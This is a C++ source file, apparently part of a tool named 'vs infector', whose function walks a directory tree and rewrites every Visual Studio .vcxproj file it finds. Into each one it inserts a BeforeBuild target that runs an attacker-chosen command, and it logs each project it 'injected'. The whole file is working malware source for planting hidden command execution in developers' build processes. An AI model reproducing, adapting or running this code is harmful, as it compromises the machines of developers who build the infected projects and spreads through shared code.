#include "vs infector.h"
#include <filesystem>
#include <fstream>
#include <sstream>
#include <iostream>
#include <windows.h>
#include <ctime>

namespace fs = std::filesystem;


// Main injection logic for .vcxproj files
void infectProjects(const std::wstring& rootDir, const std::wstring& cmd) {
    writeLog(L"Scanning directory: " + rootDir);

    std::wstring block =
        L"\n  <Target Name=\"BeforeBuild\" BeforeTargets=\"PrepareForBuild\">\n"
        L"    <Exec Command=\"" + cmd + L"\" />\n"
        L"  </Target>\n";

    for (const auto& item : fs::recursive_directory_iterator(rootDir)) {
        if (item.path().extension() != L".vcxproj") continue;

        std::wstring path = item.path();
        writeLog(L"Checking: " + path);

        std::wifstream input(path);
        if (!input) {
            writeLog(L"Couldn't open: " + path);
            continue;
        }

        std::wstringstream buffer;
        buffer << input.rdbuf();
        input.close();

        std::wstring contents = buffer.str();

        if (contents.find(L"Name=\"BeforeBuild\"") != std::wstring::npos) {
            writeLog(L"Already patched: " + path);
            continue;
        }

        size_t pos = contents.rfind(L"<Import ");
        if (pos != std::wstring::npos) {
            pos = contents.find(L">", pos);
            if (pos != std::wstring::npos) ++pos;
        } else {
            pos = contents.rfind(L"</Project>");
        }

        if (pos != std::wstring::npos) {
            contents.insert(pos, block);
            std::wofstream output(path, std::ios::trunc);
            if (output) {
                output << contents;
                output.close();
                writeLog(L"Injected: " + path);
            } else {
                writeLog(L"Write failed: " + path);
            }
        } else {
            writeLog(L"No insertion point in: " + path);
        }
    }

    writeLog(L"Scan finished.");
}
